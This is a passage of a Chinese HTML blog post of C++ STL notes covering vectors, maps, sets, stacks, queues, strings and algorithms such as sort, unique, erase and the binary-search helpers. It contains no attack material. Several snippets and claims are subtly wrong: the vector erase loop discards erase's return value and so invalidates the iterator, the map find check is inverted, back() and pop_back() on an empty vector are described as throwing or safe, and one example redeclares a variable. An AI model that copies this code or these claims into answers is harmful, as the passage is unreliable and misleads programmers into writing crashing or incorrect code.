class="number">0x123</span> &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; ss.<span class="built_in">str</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0b0000000100100011</span><br><span class="line">00443</span><br><span class="line">291</span><br><span class="line">0x1230</span><br></pre></td></tr></table></figure>

<h1 id="三、STL-容器"><a href="#三、STL-容器" class="headerlink" title="三、STL 容器"></a>三、STL 容器</h1><ol>
<li><p>vector （连续的空间存储,可以使用[]操作符）快速的访问随机的元素，快速的在末尾插入元素，但是在序列中间岁间的插入，删除元素要慢，而且如果一开始分配的空间不够的话，有一个重新分配更大空间，然后拷贝的性能开销.</p>
</li>
<li><p>deque （小片的连续，小片间用链表相连，实际上内部有一个 map 的指针，因为知道类型，所以还是可以使用[]，只是速度没有 vector 快）快速的访问随机的元素，快速的在开始和末尾插入元素，随机的插入，删除元素要慢，空间的重新分配要比 vector 快,重新分配空间后，原有的元素不需要拷贝。对 deque 的排序操作，可将 deque 先复制到 vector，排序后在复制回 deque。</p>
</li>
<li><p>list （每个元素间用链表相连）访问随机元素不如 vector 快，随机的插入元素比 vector 快，对每个元素分配空间，所以不存在空间不够，重新分配的情况</p>
</li>
<li><p>set  内部元素唯一，用一棵平衡树结构来存储，因此遍历的时候就排序了，查找也比较快的哦。</p>
</li>
<li><p>map  一对一的映射的结合，key 不能重复。</p>
</li>
<li><p>stack  适配器，必须结合其他的容器使用，stl 中默认的内部容器是 deque。先进后出，只有一个出口，不允许遍历。</p>
</li>
<li><p>queue  是受限制的 deque，内部容器一般使用 list 较简单。先进先出，不允许遍历。</p>
</li>
</ol>
<p><strong>下面是选择顺序容器类型的一些准则</strong></p>
<ol>
<li><p>如果我们需要随机访问一个容器则 vector 要比 list 好得多。</p>
</li>
<li><p>如果我们已知要存储元素的个数则 vector  又是一个比 list 好的选择。</p>
</li>
<li><p>如果我们需要的不只是在容器两端插入和删除元素则 list 显然要比 vector 好</p>
</li>
<li><p>除非我们需要在容器首部插入和删除元素否则 vector 要比 deque 好。</p>
</li>
<li><p>如果只在容易的首部和尾部插入数据元素，则选择 deque。</p>
</li>
<li><p>如果只需要在读取输入时在容器的中间位置插入元素，然后需要随机访问元素，则可考虑输入时将元素读入到一个 List 容器，接着对此容器重新拍学，使其适合顺序访问，然后将排序后的 list 容器复制到一个 vector 容器中</p>
</li>
</ol>
<h2 id="std-vector-向量"><a href="#std-vector-向量" class="headerlink" title="std::vector 向量"></a>std::vector 向量</h2><h3 id="1-操作接口"><a href="#1-操作接口" class="headerlink" title="(1) 操作接口"></a>(1) 操作接口</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::vector&lt;Type&gt; vType;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 传回最后一个数据，不检查这个数据是否存在，不存在会抛出异常。</span></span><br><span class="line"><span class="comment"> * @return 返回值描述 (const vType &amp;)(vType &amp;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.<span class="built_in">back</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 传回第一个数据，不检查这个数据是否存在，不存在会抛出异常。</span></span><br><span class="line"><span class="comment"> * @return 返回值描述 (const vType &amp;)(vType &amp;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.<span class="built_in">front</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 判断容器是否为空。</span></span><br><span class="line"><span class="comment"> * @return 返回值描述 bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.<span class="built_in">empty</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 删除最后一个数据，空向量不会报错。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.<span class="built_in">pop_back</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 移除容器中所有数据。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description C++11前使用的插入函数</span></span><br><span class="line"><span class="comment"> * @param (const Type &amp;)要插入的数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.<span class="built_in">push_back</span>(<span class="built_in">Type</span>(param));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description C++11使用的插入函数</span></span><br><span class="line"><span class="comment"> * @param (const Type &amp;)要插入的数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.<span class="built_in">emplace_back</span>(<span class="built_in">Type</span>(param));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 返回第i个数据，相当于vType[i]</span></span><br><span class="line"><span class="comment"> * @param (size_type)数据索引</span></span><br><span class="line"><span class="comment"> * @return 返回值描述 (const vType &amp;)(vType &amp;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.<span class="built_in">at</span>(i);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 返回指向数组第一个元素的指针，空向量返回NULL</span></span><br><span class="line"><span class="comment"> * @return 返回值描述 (const vType *)(vType *)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vType.<span class="built_in">data</span>();</span><br></pre></td></tr></table></figure>

<h3 id="2-初始化"><a href="#2-初始化" class="headerlink" title="(2) 初始化"></a>(2) 初始化</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 从数组初始化</span></span><br><span class="line">    <span class="type">uint8_t</span> data[] = &#123;<span class="number">0x11</span>, <span class="number">0x34</span>, <span class="number">0x12</span>, <span class="number">0xa3</span>, <span class="number">0x01</span>, <span class="number">0x23</span>&#125;;</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">vData</span><span class="params">(data, data + <span class="keyword">sizeof</span>(data))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-删除元素"><a href="#3-删除元素" class="headerlink" title="(3) 删除元素"></a>(3) 删除元素</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::vector&lt;std::string&gt; sessionMap;</span><br><span class="line">sessionMap.<span class="built_in">emplace_back</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">sessionMap.<span class="built_in">emplace_back</span>(<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> iter = sessionMap.<span class="built_in">begin</span>(); iter != sessionMap.<span class="built_in">end</span>();) &#123;</span><br><span class="line">    <span class="comment">// 删除元素后，需要重新拿到iter，erase接口返回的就是下一个iter</span></span><br><span class="line">    <span class="keyword">if</span> (*iter == <span class="string">&quot;b&quot;</span>) &#123;</span><br><span class="line">        iter = sessionMap.<span class="built_in">erase</span>(iter);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ++iter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="std-map"><a href="#std-map" class="headerlink" title="std::map"></a>std::map</h2><h3 id="1-查找元素"><a href="#1-查找元素" class="headerlink" title="(1) 查找元素"></a>(1) 查找元素</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::map&lt;QString, std::shared_ptr&lt;Session&gt;&gt; sessionMap;</span><br><span class="line">sessionMap[<span class="string">&quot;Hello&quot;</span>] = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="comment">// count查找</span></span><br><span class="line"><span class="keyword">if</span> (sessionMap.<span class="built_in">count</span>(<span class="string">&quot;Hello&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Key \&quot;Hello\&quot; isn&#x27;t in map&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// find查找</span></span><br><span class="line"><span class="keyword">if</span> (sessionMap.<span class="built_in">find</span>(<span class="string">&quot;Hello&quot;</span>) != sessionMap.<span class="built_in">end</span>()) &#123;</span><br><span class="line">    <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Key \&quot;Hello\&quot; isn&#x27;t in map&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sessionMap[<span class="string">&quot;Hello&quot;</span>];</span><br></pre></td></tr></table></figure>

<h3 id="2-遍历元素"><a href="#2-遍历元素" class="headerlink" title="(2) 遍历元素"></a>(2) 遍历元素</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::map&lt;std::string, std::string&gt; sessionMap;</span><br><span class="line">sessionMap[<span class="string">&quot;a&quot;</span>] = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">sessionMap[<span class="string">&quot;c&quot;</span>] = <span class="string">&quot;d&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> iter = sessionMap.<span class="built_in">begin</span>(); iter != sessionMap.<span class="built_in">end</span>(); iter++) &#123;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;key &#123;&#125;, value &#123;&#125;&quot;</span>, iter-&gt;first.<span class="built_in">c_str</span>(), iter-&gt;second.<span class="built_in">c_str</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-删除元素-1"><a href="#3-删除元素-1" class="headerlink" title="(3) 删除元素"></a>(3) 删除元素</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::map&lt;std::string, std::string&gt; sessionMap;</span><br><span class="line">sessionMap[<span class="string">&quot;a&quot;</span>] = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">sessionMap[<span class="string">&quot;c&quot;</span>] = <span class="string">&quot;d&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> iter = sessionMap.<span class="built_in">begin</span>(); iter != sessionMap.<span class="built_in">end</span>();) &#123;</span><br><span class="line">    <span class="comment">// 删除元素后，需要重新拿到iter，使用iter++会先得到iter + 1的值再做清理，这样清理后会得到下一个迭代器</span></span><br><span class="line">    <span class="comment">// 如果先清理再++，会出现段错误，因为iter已经被清理掉了</span></span><br><span class="line">    <span class="keyword">if</span> (iter-&gt;second == <span class="string">&quot;d&quot;</span>) &#123;</span><br><span class="line">        sessionMap.<span class="built_in">erase</span>(iter++);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ++iter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="std-stack"><a href="#std-stack" class="headerlink" title="std::stack"></a>std::stack</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; myStack;     <span class="comment">//定义类型为int</span></span><br><span class="line">    myStack.<span class="built_in">push</span>(<span class="number">10</span>);       <span class="comment">//入栈</span></span><br><span class="line">    myStack.<span class="built_in">push</span>(<span class="number">50</span>);       <span class="comment">//入栈</span></span><br><span class="line">    <span class="type">int</span> a = myStack.<span class="built_in">top</span>();  <span class="comment">//返回栈顶元素的引用，不会出栈</span></span><br><span class="line">    myStack.<span class="built_in">pop</span>();          <span class="comment">//出栈，void型</span></span><br><span class="line">    <span class="type">bool</span> isEmpty = myStack.<span class="built_in">empty</span>();         <span class="comment">//是否为空</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size = myStack.<span class="built_in">size</span>();    <span class="comment">//栈的元素数量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="std-queue"><a href="#std-queue" class="headerlink" title="std::queue"></a>std::queue</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; myQueue;         <span class="comment">//定义类型为int</span></span><br><span class="line">    myQueue.<span class="built_in">push</span>(<span class="number">10</span>);           <span class="comment">//入队</span></span><br><span class="line">    myQueue.<span class="built_in">push</span>(<span class="number">50</span>);           <span class="comment">//入队</span></span><br><span class="line">    <span class="type">int</span> a = myQueue.<span class="built_in">front</span>();    <span class="comment">//返回队列最先进入的元素的引用，不会出队</span></span><br><span class="line">    <span class="type">int</span> b = myQueue.<span class="built_in">back</span>();     <span class="comment">//返回队列最后进入的元素的引用，不会出队</span></span><br><span class="line">    myQueue.<span class="built_in">pop</span>();              <span class="comment">//删除最先进入队列的元素，void型</span></span><br><span class="line">    <span class="type">bool</span> isEmpty = myQueue.<span class="built_in">empty</span>();         <span class="comment">//队列是否为空</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size = myQueue.<span class="built_in">size</span>();    <span class="comment">//队列的元素数量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="std-set-集合"><a href="#std-set-集合" class="headerlink" title="std::set 集合"></a>std::set 集合</h2><ul>
<li>集合里面的值唯一，可以用于去重</li>
<li>集合操作可以实现类似交集、并集、差集的计算</li>
<li>也可以看作一个无 value 的 map，底层和 map 一样使用红黑树实现</li>
</ul>
<h3 id="1-一些基本用法"><a href="#1-一些基本用法" class="headerlink" title="(1) 一些基本用法"></a>(1) 一些基本用法</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line">std::set&lt;std::string&gt; testSet;</span><br><span class="line"><span class="comment">// 插入</span></span><br><span class="line">testSet.<span class="built_in">insert</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="comment">// 转vector</span></span><br><span class="line"><span class="function">std::vector <span class="title">testV</span><span class="params">(testSet.begin(), testSet.end())</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="2-自定义类型使用set"><a href="#2-自定义类型使用set" class="headerlink" title="(2) 自定义类型使用set"></a>(2) 自定义类型使用set</h3><ul>
<li>需要重载<code>bool operator&lt;()</code></li>
</ul>
<h2 id="std-multimap-允许重复键的map"><a href="#std-multimap-允许重复键的map" class="headerlink" title="std::multimap 允许重复键的map"></a>std::multimap 允许重复键的map</h2><h3 id="1-实例"><a href="#1-实例" class="headerlink" title="1) 实例"></a>1) 实例</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;log.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *argV[])</span> </span>&#123;</span><br><span class="line">    std::multimap&lt;<span class="type">int</span>, string&gt; testMap;</span><br><span class="line">    testMap.<span class="built_in">insert</span>(std::<span class="built_in">make_pair</span>(<span class="number">6</span>, <span class="string">&quot;12&quot;</span>));</span><br><span class="line">    testMap.<span class="built_in">insert</span>(std::<span class="built_in">make_pair</span>(<span class="number">5</span>, <span class="string">&quot;123&quot;</span>));</span><br><span class="line">    testMap.<span class="built_in">insert</span>(std::<span class="built_in">make_pair</span>(<span class="number">5</span>, <span class="string">&quot;123&quot;</span>));</span><br><span class="line">    testMap.<span class="built_in">insert</span>(std::<span class="built_in">make_pair</span>(<span class="number">5</span>, <span class="string">&quot;1235&quot;</span>));</span><br><span class="line">    testMap.<span class="built_in">insert</span>(std::<span class="built_in">make_pair</span>(<span class="number">5</span>, <span class="string">&quot;12&quot;</span>));</span><br><span class="line">    testMap.<span class="built_in">insert</span>(std::<span class="built_in">make_pair</span>(<span class="number">4</span>, <span class="string">&quot;12&quot;</span>));</span><br><span class="line">    testMap.<span class="built_in">insert</span>(std::<span class="built_in">make_pair</span>(<span class="number">5</span>, <span class="string">&quot;1245&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> np = testMap.<span class="built_in">equal_range</span>(<span class="number">5</span>);       <span class="comment">// 获取所有5作为key的元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = np.first; iter != np.second; iter++) &#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, iter-&gt;first, iter-&gt;second));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 123</span><br><span class="line">5 123</span><br><span class="line">5 1235</span><br><span class="line">5 12</span><br><span class="line">5 1245</span><br></pre></td></tr></table></figure>

<h2 id="std-string"><a href="#std-string" class="headerlink" title="std::string"></a>std::string</h2><h3 id="1-data-和-c-str-区别"><a href="#1-data-和-c-str-区别" class="headerlink" title="1) data()和 c_str()区别"></a>1) data()和 c_str()区别</h3><p>data()效率较 c_str()高一些，但是 c_str()更加标准，结尾会加入’\0’。</p>
<h3 id="2-find-last-of"><a href="#2-find-last-of" class="headerlink" title="2) find_last_of()"></a>2) find_last_of()</h3><p>可以从后往前找匹配的字符，并且，这个字符可以以字串的形式给出，也就是只要匹配参数中字串的任意字符就返回其位置。第二参数可选，为起始位置，默认为 npos。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::string str = <span class="string">&quot;012345678&quot;</span>;</span><br><span class="line"><span class="type">int</span> index = str.<span class="built_in">find_last_of</span>(<span class="string">&quot;3&quot;</span>);  <span class="comment">//3</span></span><br><span class="line">index = str.<span class="built_in">find_last_of</span>(<span class="string">&quot;8&quot;</span>);      <span class="comment">//8</span></span><br><span class="line">index = str.<span class="built_in">find_last_of</span>(<span class="string">&quot;8&quot;</span>, <span class="number">7</span>);   <span class="comment">//-1</span></span><br><span class="line">index = str.<span class="built_in">find_last_of</span>(<span class="string">&quot;8&quot;</span>, <span class="number">8</span>);   <span class="comment">//8</span></span><br><span class="line">index = str.<span class="built_in">find_last_of</span>(<span class="string">&quot;0&quot;</span>);      <span class="comment">//0</span></span><br><span class="line">index = str.<span class="built_in">find_last_of</span>(<span class="string">&quot;9&quot;</span>);      <span class="comment">//-1</span></span><br><span class="line">index = str.<span class="built_in">find_last_of</span>(<span class="string">&quot;24&quot;</span>);     <span class="comment">//4</span></span><br></pre></td></tr></table></figure>

<h3 id="3-substr"><a href="#3-substr" class="headerlink" title="3) substr()"></a>3) substr()</h3><p>两个参数，第一个为起始位置，第二个为 size。</p>
<h2 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h2><ul>
<li><code>push()</code>，实际上是调用的底层容器的<code>push_back()</code>函数，新元素的值是 push 函数参数的一个拷贝。</li>
<li><code>emplace()</code>，实际上是调用的底层容器的<code>emplace_back()</code>函数，新元素的值是在容器内部就地构造的，不需要移动或者拷贝。</li>
</ul>
<h2 id="通用工具方法-algorithm"><a href="#通用工具方法-algorithm" class="headerlink" title="通用工具方法 algorithm"></a>通用工具方法 algorithm</h2><h3 id="max-最大值"><a href="#max-最大值" class="headerlink" title="max()最大值"></a>max()最大值</h3><h3 id="min-最小值"><a href="#min-最小值" class="headerlink" title="min()最小值"></a>min()最小值</h3><h3 id="swap-交换两个值"><a href="#swap-交换两个值" class="headerlink" title="swap()交换两个值"></a>swap()交换两个值</h3><h3 id="sort-排序"><a href="#sort-排序" class="headerlink" title="sort()排序"></a>sort()排序</h3><p><strong>注意事项</strong></p>
<ul>
<li>如果自定义排序函数，需要满足下面的原则</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 对于任意元素a，需满足 comp(a, a) == false</span><br><span class="line">2. 对于任意两个元素a和b，若 comp(a, b)==true 则要满足 comp(b, a)==false</span><br><span class="line">3. 对于任意三个元素a、b和c，若 comp(a, b)==true 且 comp(b, c)==true 则需要满足 comp(a, c)==true</span><br></pre></td></tr></table></figure>

<ul>
<li>具体原因可以看这个文章<a href="https://blog.csdn.net/albertsh/article/details/119523587">C++中使用 std::sort 自定义排序规则时要注意的崩溃问题</a></li>
<li>解释一下原因就是<ol>
<li>stl 的排序使用了快排、堆排和插排</li>
<li>在插排时，代码为了效率，不考虑边界判断</li>
<li>如果写了 comp(a, a) &#x3D;&#x3D; true，会导致插排的循环一直向后找到越界</li>
</ol>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; a = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, a.<span class="built_in">front</span>()));</span><br><span class="line">    <span class="comment">// 返回true，i排j前，返回false，j排i前；i == j，必须返回false</span></span><br><span class="line">    std::<span class="built_in">sort</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>(), [](<span class="type">const</span> <span class="type">int</span> &amp;i, <span class="type">const</span> <span class="type">int</span> &amp;j)&#123;</span><br><span class="line">        <span class="keyword">return</span> i &gt; j;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, a.<span class="built_in">front</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="count-统计数量"><a href="#count-统计数量" class="headerlink" title="count()统计数量"></a>count()统计数量</h3><h3 id="unique-去重"><a href="#unique-去重" class="headerlink" title="unique()去重"></a>unique()去重</h3><ul>
<li>从头到尾遍历，将相邻的相同元素，留一个，其他的放到末尾</li>
<li>返回末尾筛选出的元素第一个</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; input;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    cin &gt;&gt; tmp;</span><br><span class="line">    input.<span class="built_in">push_back</span>(tmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 先排序</span></span><br><span class="line"><span class="built_in">sort</span>(input.<span class="built_in">begin</span>(), input.<span class="built_in">end</span>());</span><br><span class="line"><span class="comment">// 擦除相同元素</span></span><br><span class="line">input.<span class="built_in">erase</span>(<span class="built_in">unique</span>(input.<span class="built_in">begin</span>(), input.<span class="built_in">end</span>()), input.<span class="built_in">end</span>());</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> &amp;tmp : input) &#123;</span><br><span class="line">    cout &lt;&lt; tmp &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="erase-擦除"><a href="#erase-擦除" class="headerlink" title="erase()擦除"></a>erase()擦除</h3><p>使用遍历的时候，如果去除一个对象，遍历的变量会直接指向下一个，需要注意</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::vector&lt;Type&gt; vType;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = vType.<span class="built_in">cbegin</span>(); it != vType.<span class="built_in">cend</span>();) &#123;</span><br><span class="line">    <span class="keyword">if</span>(...) &#123;</span><br><span class="line">        <span class="comment">//擦除后会直接指向下一块地址，不需要++</span></span><br><span class="line">        vType.<span class="built_in">erase</span>(it);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    it++</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二分查找-lower-bound-upper-bound-binary-search-equal-range"><a href="#二分查找-lower-bound-upper-bound-binary-search-equal-range" class="headerlink" title="二分查找 lower_bound&#x2F;upper_bound&#x2F;binary_search&#x2F;equal_range"></a>二分查找 lower_bound&#x2F;upper_bound&#x2F;binary_search&#x2F;equal_range</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; listNum = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//默认按照从小到大的顺序</span></span><br><span class="line">    <span class="comment">//指向第一个3</span></span><br><span class="line">    <span class="keyword">auto</span> ln = <span class="built_in">lower_bound</span>(listNum.<span class="built_in">begin</span>(), listNum.<span class="built_in">end</span>(), <span class="number">3</span>);</span><br><span class="line">    <span class="comment">//指向最后一个5后面的6</span></span><br><span class="line">    <span class="keyword">auto</span> rn = <span class="built_in">upper_bound</span>(listNum.<span class="built_in">begin</span>(), listNum.<span class="built_in">end</span>(), <span class="number">5</span>);</span><br><span class="line">    <span class="comment">//是否存在4</span></span><br><span class="line">    <span class="type">bool</span> isExist = <span class="built_in">binary_search</span>(listNum.<span class="built_in">begin</span>(), listNum.<span class="built_in">end</span>(), <span class="number">4</span>);</span><br><span class="line">    <span class="comment">//可以得出存在于[3, 5]区间的个数，5个</span></span><br><span class="line">    <span class="type">int</span> count = rn - ln;</span><br><span class="line">    <span class="comment">// 查找k值个数，返回为std::pair(lower_bound(listNum.begin(), listNum.end(), 3),</span></span><br><span class="line">    <span class="comment">//                              upper_bound(listNum.begin(), listNum.end(), 3))</span></span><br><span class="line">    <span class="comment">// 也就是std::pair(第一个3的地址, 最后一个3后面的4的地址)，但和两个函数实现不一样</span></span><br><span class="line">    <span class="keyword">auto</span> tmp = <span class="built_in">equal_range</span>(listNum.<span class="built_in">begin</span>(), listNum.<span class="built_in">end</span>(), <span class="number">3</span>)</span><br><span class="line">    count = tmp.second - tmp.first;</span><br><span class="line"></span><br><span class="line">    listNum = &#123;<span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="comment">//从大到小的顺序</span></span><br><span class="line">    <span class="comment">//lambda表达式中，3为b，找到第一个为false的地方，即第一个3</span></span><br><span class="line">    <span class="keyword">auto</span> ln = <span class="built_in">lower_bound</span>(listNum.<span class="built_in">begin</span>(), listNum.<span class="built_in">end</span>(), <span class="number">3</span>, [](<span class="type">int</span> a, <span class="type">int</span> b) &#123; <span class="built_in">return</span> (a &gt; b); &#125;);</span><br><span class="line">    <span class="comment">//lambda表达式中，3为a，找到第一个为true的地方，即最后一个3后面的2</span></span><br><span class="line">    <span class="keyword">auto</span> rn = <span class="built_in">upper_bound</span>(listNum.<span class="built_in">begin</span>(), listNum.<span class="built_in">end</span>(), <span class="number">5</span>, [](<span class="type">int</span> a, <span class="type">int</span> b) &#123; <span class="built_in">return</span> (a &gt; b); &#125;);</span><br><span class="line">    <span class="comment">//是否存在q</span></span><br><span class="line">    <span class="type">bool</span> isExist = <span class="built_in">binary_search</span>(listNum.<span class="built_in">begin</span>(), listNum.<span class="built_in">end</span>(), <span class="number">4</span>, [](<span class="type">int</span> a, <span class="type">int</span> b) &#123; <span class="built_in">return</span> (a &gt; b); &#125;);</span><br><span class="line">    <span class="comment">//可以得出存在于[l, r]区间的个数</span></span><br><span class="line">    <span class="type">int</span> count = rn - ln;</span><br><span class="line">    <span class="comment">// 查找3的个数，返回为std::pair(第一个3的地址, 最后一个3后面的4的地址)</span></span><br><span class="line">    <span class="keyword">auto</span> tmp = <span class="built_in">equal_range</span>(listNum.<span class="built_in">begin</span>(), listNum.<span 